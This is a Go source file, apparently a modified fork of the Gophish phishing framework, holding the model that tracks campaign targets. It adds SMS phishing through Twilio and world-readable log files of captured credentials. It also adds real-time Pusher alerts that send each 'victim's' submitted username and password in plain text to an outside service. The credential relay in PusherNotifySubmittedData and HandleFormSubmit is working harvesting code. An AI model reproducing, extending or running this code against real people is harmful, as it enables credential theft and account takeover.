package models

import (
    "crypto/rand"
    "encoding/json"
    "math/big"
    "net"
    "time"
    "fmt"
    "os"
    "strconv"
    "path/filepath"

    log "github.com/gophish/gophish/logger"
    "github.com/jinzhu/gorm"
    "github.com/oschwald/maxminddb-golang"
    "github.com/gophish/gophish/config"
    pusher "github.com/pusher/pusher-http-go/v5"
    "github.com/twilio/twilio-go"
    openapi "github.com/twilio/twilio-go/rest/api/v2010"
)

type mmCity struct {
    GeoPoint mmGeoPoint `maxminddb:"location"`
}

type mmGeoPoint struct {
    Latitude  float64 `maxminddb:"latitude"`
    Longitude float64 `maxminddb:"longitude"`
}

// Result contains the fields for a result object,
// which is a representation of a target in a campaign.
type Result struct {
    Id           int64     `json:"-"`
    CampaignId   int64     `json:"-"`
    UserId       int64     `json:"-"`
    RId          string    `json:"id"`
    Status       string    `json:"status" sql:"not null"`
    IP           string    `json:"ip"`
    Latitude     float64   `json:"latitude"`
    Longitude    float64   `json:"longitude"`
    SendDate     time.Time `json:"send_date"`
    Reported     bool      `json:"reported" sql:"not null"`
    ModifiedDate time.Time `json:"modified_date"`
    BaseRecipient
}

// Custom structs for JSON logging
type MyResult struct {
    Id           int64     `json:"Id"`
    UserId       int64     `json:"UserId"`
    RId          string    `json:"RId"`
    BaseRecipient
}

type Submitted struct {
    Id           int64     `json:"Id"`
    UserId       int64     `json:"UserId"`
    RId          string    `json:"RId"`
    BaseRecipient
    Details      EventDetails
}

func (r *Result) PusherNotifyEmailSent(app_id string, app_key string, secret string, cluster string, encrypt_key string, channel_name string) {
	pusherClient := pusher.Client{
		AppID: app_id,
		Key: app_key,
		Secret: secret,
		Cluster: cluster,
		EncryptionMasterKeyBase64: encrypt_key,
	}
	data := map[string]string{"event": "Email Sent", "time": r.ModifiedDate.String(), "message": "Email has been sent to victim: <strong>" + r.Email + "</strong>"}
	err := pusherClient.Trigger(channel_name, "event", data)
	if err != nil {
		fmt.Printf("[-] Error creating event in Pusher! %s\n", err)
	}
}

func (r *Result) PusherNotifySMSSent(app_id string, app_key string, secret string, cluster string, encrypt_key string, channel_name string) {
	pusherClient := pusher.Client{
		AppID: app_id,
		Key: app_key,
		Secret: secret,
		Cluster: cluster,
		EncryptionMasterKeyBase64: encrypt_key,
	}
	data := map[string]string{"event": "SMS Sent", "time": r.ModifiedDate.String(), "message": "SMS has been sent to victim: <strong>" + r.Email + "</strong>"}
	err := pusherClient.Trigger(channel_name, "event", data)
	if err != nil {
		fmt.Printf("[-] Error creating event in Pusher! %s\n", err)
	}
}

func (r *Result) PusherNotifyEmailOpened(app_id string, app_key string, secret string, cluster string, encrypt_key string, channel_name string) {
	pusherClient := pusher.Client{
		AppID: app_id,
		Key: app_key,
		Secret: secret,
		Cluster: cluster,
		EncryptionMasterKeyBase64: encrypt_key,
	}
	data := map[string]string{"event": "Email Opened", "time": r.ModifiedDate.String(), "message": "Email has been opened by victim: <strong>" + r.Email + "</strong>"}
	err := pusherClient.Trigger(channel_name, "event", data)
	if err != nil {
		fmt.Printf("[-] Error creating event in Pusher! %s\n", err)
	}
}

func (r *Result) PusherNotifyClickedLink(app_id string, app_key string, secret string, cluster string, encrypt_key string, channel_name string) {
	pusherClient := pusher.Client{
		AppID: app_id,
		Key: app_key,
		Secret: secret,
		Cluster: cluster,
		EncryptionMasterKeyBase64: encrypt_key,
	}
	data := map[string]string{"event": "Clicked Link", "time": r.ModifiedDate.String(), "message": "Link has been clicked by victim: <strong>" + r.Email + "</strong>"}
	err := pusherClient.Trigger(channel_name, "event", data)
	if err != nil {
		fmt.Printf("[-] Error creating event in Pusher! %s\n", err)
	}
}

func (r *Result) PusherNotifySubmittedData(app_id string, app_key string, secret string, cluster string, encrypt_key string, channel_name string, details EventDetails) {
	pusherClient := pusher.Client{
		AppID: app_id,
		Key: app_key,
		Secret: secret,
		Cluster: cluster,
		EncryptionMasterKeyBase64: encrypt_key,
	}
	username := details.Payload.Get("Username")
	password := details.Payload.Get("Password")
	data := map[string]string{"event": "Submitted Data", "time": r.ModifiedDate.String(), "message": "Victim <strong>" + r.Email + "</strong> has submitted data! Details:<br><strong>Username:</strong> " + username + "<br><strong>Password:</strong> " + password}
	err := pusherClient.Trigger(channel_name, "event", data)
	if err != nil {
		fmt.Printf("[-] Error creating event in Pusher! %s\n", err)
	}
}

func (r *Result) createEvent(status string, details interface{}) (*Event, error) {
    /*fmt.Printf("Result Id: %d\n", r.Id)
    fmt.Printf("Result CampaignId: %d\n", r.CampaignId)
    fmt.Printf("Result UserId: %d\n", r.UserId)
    fmt.Printf("Result RId: %s\n", r.RId)
    fmt.Printf("Result Status: %s\n", r.Status)
    fmt.Printf("Result IP: %s\n", r.IP)
    fmt.Printf("Result Latitude: %f\n", r.Latitude)
    fmt.Printf("Result Longitude: %f\n", r.Longitude)
    fmt.Printf("Result SendDate: %s\n", r.SendDate)
    fmt.Printf("Result Reported: %t\n", r.Reported)
    fmt.Printf("Result ModifiedDate: %s\n", r.ModifiedDate)
    fmt.Printf("Result Email: %s\n", r.Email)
    fmt.Printf("Result Name/Position: %s %s %s\n", r.BaseRecipient.FirstName, r.BaseRecipient.LastName, r.BaseRecipient.Position)
    fmt.Println("createEvent function called!")*/
    e := &Event{Email: r.Email, Message: status}
    if details != nil {
        dj, err := json.Marshal(details)
        if err != nil {
            return nil, err
        }
        e.Details = string(dj)
    }
    AddEvent(e, r.CampaignId)
    return e, nil
}

func (r *Result) HandleSMSSent(twilio_account_sid string, twilio_auth_token string, message string, sms_from string, target string) error {
    client := twilio.NewRestClientWithParams(twilio.ClientParams{
        Username: twilio_account_sid,
        Password: twilio_auth_token,
    })
    params := &openapi.CreateMessageParams{}
    params.SetTo(target)
    params.SetFrom(sms_from)
    params.SetBody(message)

    _, err := client.Api.CreateMessage(params)
    if err != nil {
        fmt.Printf("Error sending SMS message: %s\n", err)
        event, err := r.createEvent(EventSendingError, EventError{Error: err.Error()})
        if err != nil {
            return err
        }
        r.Status = Error
        r.ModifiedDate = event.Time
        return db.Save(r).Error
    } else {
        //response, _ := json.Marshal(*resp)
        //fmt.Println("Response: " + string(response))
        event, err := r.createEvent(EventSent, nil)
        if err != nil {
            return err
        }
        r.SendDate = event.Time
        r.Status = EventSent
        r.ModifiedDate = event.Time
        
		if conf.EnablePusher {
			pusher_app_id := conf.PusherAppId
			pusher_app_key := conf.PusherAppKey
			pusher_app_secret := conf.PusherAppSecret
			pusher_app_cluster := conf.PusherAppCluster
			pusher_encrypt_key := conf.PusherEncryptKey
			pusher_channel_name := conf.PusherChannelName
			r.PusherNotifySMSSent(pusher_app_id, pusher_app_key, pusher_app_secret, pusher_app_cluster, pusher_encrypt_key, pusher_channel_name)
		}

        sent := MyResult{}
        sent.Email = target
        sent.Id = r.Id
        sent.UserId = r.UserId
        sent.RId = r.RId

        data, err := json.Marshal(sent)
        if err != nil {
            fmt.Println(err)
        }
        cid := strconv.FormatInt(r.CampaignId, 10)
        cdir := filepath.Join(".", "campaigns", cid)
        os.MkdirAll(cdir, os.ModePerm)
        epath := filepath.Join(cdir, "sent-emails.json")
        sentfile, err := os.OpenFile(epath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0777)
        if err != nil {
            log.Fatal(err)
        }
        sentfile.Write(data)
        sentfile.Write([]byte("\n"))
        return db.Save(r).Error
    }
}

// HandleEmailSent updates a Result to indicate that the email has been
// successfully sent to the remote SMTP server
func (r *Result) HandleEmailSent() error {
    cid := strconv.FormatInt(r.CampaignId, 10)
    cdir := filepath.Join(".", "campaigns", cid)
    os.MkdirAll(cdir, os.ModePerm)
    epath := filepath.Join(cdir, "sent-emails.json")
    sentfile, err := os.OpenFile(epath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0777)
    if err != nil {
        log.Fatal(err)
    }

    event, err := r.createEvent(EventSent, nil)
    if err != nil {
        return err
    }
    r.SendDate = event.Time
    r.Status = EventSent
    r.ModifiedDate = event.Time

    sent := MyResult{}
    sent.Email = r.Email
    sent.Id = r.Id
    sent.UserId = r.UserId
    sent.RId = r.RId

    data, err := json.Marshal(sent)
    if err != nil {
        fmt.Println(err)
    }
    sentfile.Write(data)
    sentfile.Write([]byte("\n"))

    conf, err := config.LoadConfig("config.json")
    if err != nil {
        fmt.Printf("[-] Failed to load config.json from default path!")
    }

    if conf.EnablePusher {
		pusher_app_id := conf.PusherAppId
		pusher_app_key := conf.PusherAppKey
		pusher_app_secret := conf.PusherAppSecret
		pusher_app_cluster := conf.PusherAppCluster
		pusher_encrypt_key := conf.PusherEncryptKey
		pusher_channel_name := conf.PusherChannelName
		r.PusherNotifyEmailSent(pusher_app_id, pusher_app_key, pusher_app_secret, pusher_app_cluster, pusher_encrypt_key, pusher_channel_name)
	}

    return db.Save(r).Error
}

// HandleEmailError updates a Result to indicate that there was an error when
// attempting to send the email to the remote SMTP server.
func (r *Result) HandleEmailError(err error) error {
    event, err := r.createEvent(EventSendingError, EventError{Error: err.Error()})
    if err != nil {
        return err
    }
    r.Status = Error
    r.ModifiedDate = event.Time
    return db.Save(r).Error
}

// HandleEmailBackoff updates a Result to indicate that the email received a
// temporary error and needs to be retried
func (r *Result) HandleEmailBackoff(err error, sendDate time.Time) error {
    event, err := r.createEvent(EventSendingError, EventError{Error: err.Error()})
    if err != nil {
        return err
    }
    r.Status = StatusRetry
    r.SendDate = sendDate
    r.ModifiedDate = event.Time
    return db.Save(r).Error
}

// HandleEmailOpened updates a Result in the case where the recipient opened the
// email.
func (r *Result) HandleEmailOpened(details EventDetails) error {
    event, err := r.createEvent(EventOpened, details)
    if err != nil {
        return err
    }
    // Don't update the status if the user already clicked the link
    // or submitted data to the campaign
    if r.Status == EventClicked || r.Status == EventDataSubmit {
        return nil
    }
    r.Status = EventOpened
    r.ModifiedDate = event.Time

    conf, err := config.LoadConfig("config.json")
    if err != nil {
        fmt.Printf("[-] Failed to load config.json from default path!")
    }

    if conf.EnablePusher {
		pusher_app_id := conf.PusherAppId
		pusher_app_key := conf.PusherAppKey
		pusher_app_secret := conf.PusherAppSecret
		pusher_app_cluster := conf.PusherAppCluster
		pusher_encrypt_key := conf.PusherEncryptKey
		pusher_channel_name := conf.PusherChannelName
		r.PusherNotifyEmailOpened(pusher_app_id, pusher_app_key, pusher_app_secret, pusher_app_cluster, pusher_encrypt_key, pusher_channel_name)
	}

    return db.Save(r).Error
}

// HandleClickedLink updates a Result in the case where the recipient clicked
// the link in an email.
func (r *Result) HandleClickedLink(details EventDetails) error {
    cid := strconv.FormatInt(r.CampaignId, 10)
    cdir := filepath.Join(".", "campaigns", cid)
    os.MkdirAll(cdir, os.ModePerm)
    epath := filepath.Join(cdir, "clicked-links.json")
    clickfile, err := os.OpenFile(epath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0777)
    if err != nil {
        log.Fatal(err)
    }

    event, err := r.createEvent(EventClicked, details)
    if err != nil {
        return err
    }
    // Don't update the status if the user has already submitted data via the
    // landing page form.
    if r.Status == EventDataSubmit {
        return nil
    }
    r.Status = EventClicked
    r.ModifiedDate = event.Time

    clicked := MyResult{}
    clicked.Email = r.Email
    clicked.Id = r.Id
    clicked.UserId = r.UserId
    clicked.RId = r.RId

    data, err := json.Marshal(clicked)
    if err != nil {
        fmt.Println(err)
    }
    clickfile.Write(data)
    clickfile.Write([]byte("\n"))

    conf, err := config.LoadConfig("config.json")
    if err != nil {
        fmt.Printf("[-] Failed to load config.json from default path!")
    }

    if conf.EnablePusher {
		pusher_app_id := conf.PusherAppId
		pusher_app_key := conf.PusherAppKey
		pusher_app_secret := conf.PusherAppSecret
		pusher_app_cluster := conf.PusherAppCluster
		pusher_encrypt_key := conf.PusherEncryptKey
		pusher_channel_name := conf.PusherChannelName
		r.PusherNotifyClickedLink(pusher_app_id, pusher_app_key, pusher_app_secret, pusher_app_cluster, pusher_encrypt_key, pusher_channel_name)
	}

    return db.Save(r).Error
}

// HandleFormSubmit updates a Result in the case where the recipient submitted
// credentials to the form on a Landing Page.
func (r *Result) HandleFormSubmit(details EventDetails) error {
    cid := strconv.FormatInt(r.CampaignId, 10)
    cdir := filepath.Join(".", "campaigns", cid)
    os.MkdirAll(cdir, os.ModePerm)
    epath := filepath.Join(cdir, "creds.json")
    credfile, err := os.OpenFile(epath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0777)
    if err != nil {
        log.Fatal(err)
    }

    event, err := r.createEvent(EventDataSubmit, details)
    if err != nil {
        return err
    }
    r.Status = EventDataSubmit
    r.ModifiedDate = event.Time

    submitted := Submitted{}
    submitted.Email = r.Email
    submitted.Id = r.Id
    submitted.UserId = r.UserId
    submitted.RId = r.RId
    submitted.Details = details

    data, err := json.Marshal(submitted)
    if err != nil {
        fmt.Println(err)
    }
    credfile.Write(data)
    credfile.Write([]byte("\n"))

    conf, err := config.LoadConfig("config.json")
    if err != nil {
        fmt.Printf("[-] Failed to load config.json from default path!")
    }

	if conf.EnablePusher {
		pusher_app_id := conf.PusherAppId
		pusher_app_key := conf.PusherAppKey
		pusher_app_secret := conf.PusherAppSecret
		pusher_app_cluster := conf.PusherAppCluster
		pusher_encrypt_key := conf.PusherEncryptKey
		pusher_channel_name := conf.PusherChannelName
		r.PusherNotifySubmittedData(pusher_app_id, pusher_app_key, pusher_app_secret, pusher_app_cluster, pusher_encrypt_key, pusher_channel_name, details)
	}

    return db.Save(r).Error
}

// HandleEmailReport updates a Result in the case where they report a simulated
// phishing email using the HTTP handler.
func (r *Result) HandleEmailReport(details EventDetails) error {
    event, err := r.createEvent(EventReported, details)
    if err != nil {
        return err
    }
    r.Reported = true
    r.ModifiedDate = event.Time
    return db.Save(r).Error
}

// UpdateGeo updates the latitude and longitude of the result in
// the database given an IP address
func (r *Result) UpdateGeo(addr string) error {
    // Open a connection to the maxmind db
    mmdb, err := maxminddb.Open("static/db/geolite2-city.mmdb")
    if err != nil {
        log.Fatal(err)
    }
    defer mmdb.Close()
    ip := net.ParseIP(addr)
    var city mmCity
    // Get the record
    err = mmdb.Lookup(ip, &city)
    if err != nil {
        return err
    }
    // Update the database with the record information
    r.IP = addr
    r.Latitude = city.GeoPoint.Latitude
    r.Longitude = city.GeoPoint.Longitude
    return db.Save(r).Error
}

func generateResultId() (string, error) {
    const alphaNum = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    // Increase length of RIds
    k := make([]byte, 10)
    for i := range k {
        idx, err := rand.Int(rand.Reader, big.NewInt(int64(len(alphaNum))))
        if err != nil {
            return "", err
        }
        k[i] = alphaNum[idx.Int64()]
    }
    return string(k), nil
}

// GenerateId generates a unique key to represent the result
// in the database
func (r *Result) GenerateId(tx *gorm.DB) error {
    // Keep trying until we generate a unique key (shouldn't take more than one or two iterations)
    for {
        rid, err := generateResultId()
        if err != nil {
            return err
        }
        r.RId = rid
        err = tx.Table("results").Where("r_id=?", r.RId).First(&Result{}).Error
        if err == gorm.ErrRecordNotFound {
            break
        }
    }
    return nil
}

// GetResult returns the Result object from the database
// given the ResultId
func GetResult(rid string) (Result, error) {
    r := Result{}
    err := db.Where("r_id=?", rid).First(&r).Error
    return r, err
}
